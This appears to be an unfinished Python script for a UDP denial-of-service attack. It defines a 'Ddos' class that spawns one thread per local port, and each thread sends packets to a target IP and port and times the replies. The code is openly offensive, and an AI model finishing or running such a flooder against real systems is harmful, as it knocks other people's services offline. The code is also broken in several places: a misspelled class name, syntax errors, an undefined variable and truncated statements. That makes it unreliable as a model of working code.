import socket
import time
from threading import Thread

class Ddos:
    def __init__(self, targetip, targetport, ip, testList):
        self.nodes = []
        self.portRange = 65535
        self.args = dict()
        self.args["targetip"] = targetip
        self.args["targetport"] = int(targetport)
        self.args["ip"] = ip
        self.args["testList"] = testList
        self.args["numOfPacket"] = 3

    def attack(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        resultList = [None] * self.portRange
        analyzer = Analyzer()
        self.args["message"] = analyzer.sendMsg()
        for port in range(self.portRange):
            sock.bind((self.args["ip"], port))
            self.args["socket"] = sock
            attacker = Attcker(self.args, resultList)
            attacker.daemon = True
            attacker.start()
            self.nodes.append(attacker)
        [node.join() for node in self.nodes]
        for 

class Attacker(Thread):
    def __init__(self, args, resultList):
        Thread.__init__(self)
        self.args = args
        self.resultList = resultList
        self.result = dict()

    def run(self):
        socket = self.args["socket"]
        analyzer = Analyzer()
        self.sendPacket(socket, analyzer)
   
    def sendPacket(self, socket, analyzer):
        execTime = [0] * self.args["numOfPacket"]
        results = [None] * self.args["numOfPacket"]
        for i in range(self.args["numOfPacket"])):
            start = time.time()
            socket.sendto(message, (self.args["targetip"], self.args.["targetport"]))
            result = self.socket.recvfrom(4096)
            end = time.time()
            execTime = end - start
            results.append(result)
        analyzer

class Analyzer:
    def __init__(self):
        self.result = dict()

    @staticmethod
    def 
